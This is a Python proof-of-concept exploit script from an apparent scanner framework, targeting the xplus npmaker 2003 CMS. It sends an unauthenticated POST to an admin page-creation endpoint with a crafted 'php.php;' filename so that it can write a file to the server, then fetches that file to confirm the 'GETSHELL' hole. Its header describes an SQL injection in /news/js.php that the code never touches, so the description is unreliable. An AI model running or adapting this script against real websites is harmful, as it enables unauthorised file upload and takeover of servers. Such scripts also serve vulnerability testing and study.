#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: xplus npmaker 2003系统GETSHELL
referer: http://www.hackdig.com/?07/hack-5007.htm
author: Lucifer
description: 文件/news/js.php中,参数f_id存在SQL注入。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class xplus_2003_getshell_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {
            "onepage[name]":"81dc9bdb52d04dc20036dbd8313ed055",
            "onepage[filename]":"php.php;",
            "onepage[content]":"",
            "id":"",
            "onepage_submit":"%CC%E1%BD%BB"
        }
        payload = "/www/index.php?mod=admin&con=onepage&act=addpost"
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            verifyurl = self.url + "/shtml/php.php;.shtml"
            req2 = requests.get(verifyurl, headers=headers, timeout=10, verify=False)
            if req2.status_code == 200 and r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
                cprint("[+]存在xplus npmaker 2003系统GETSHELL漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
                return True, vulnurl, "xplus npmaker 2003系统GETSHELL", payload, req.text
            else:
                cprint("[-]不存在xplus_2003_getshell漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = xplus_2003_getshell_BaseVerify(sys.argv[1])
    testVuln.run()